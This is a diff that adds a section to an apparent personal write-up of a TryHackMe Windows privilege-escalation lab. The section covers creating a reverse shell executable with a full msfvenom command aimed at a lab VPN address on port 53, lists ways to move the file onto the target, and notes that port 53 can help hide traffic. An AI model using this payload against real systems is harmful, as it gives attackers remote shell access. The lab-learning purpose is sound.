@@ -44,6 +44,24 @@
 *image source https://tryhackme.com/room/windows10privesc*
 
 ## Generating a Reverse Shell Executable
+
+The first step is going to be to create a reverse shell executable using msfvenom. Then I need to transfer this binary over to the target machine. The authors of this room have you transfer this file via SMB. However there are other ways of doing this, that I will also show here. They include, transfering the binary via FTP, netcat, exe2hex, and http. Depending on the firewalls certain ports may not be available, having multiple ways to transfer your files in your virtual tool belt is always a good thing.
+
+### Creating reverse.exe
+
+We need to know our ipv4 address on the tryhackme VPN before we can craft our revshell. Also in the example the author uses port 53 as the listening port. This is the port normally used by DNS, we may be using this for firewall reasons or because it is a good port to hide traffic, in any case I will be keeping it the same for my binary.
+
+![image](https://user-images.githubusercontent.com/83407557/181602930-78389fa7-8de1-4d9c-bfb0-821e62fb4b48.png)*getting ipv4 address on THM vpn*
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.77.38 LPORT=53 -f exe -o reverse.exe`
+
+![image](https://user-images.githubusercontent.com/83407557/181603375-da05a314-7e5a-43ed-ac1b-ae194ac8bd25.png)*Creating binary with msfvenom*
+
+### Transfering reverse.exe Via SMB (The authors way)
+
+
+
+
 ## Service Exploits - Insecure Service Permissions
 ## Service Exploits - Unquoted Service Path
 ## Service Exploits - Weak Registry Permissions
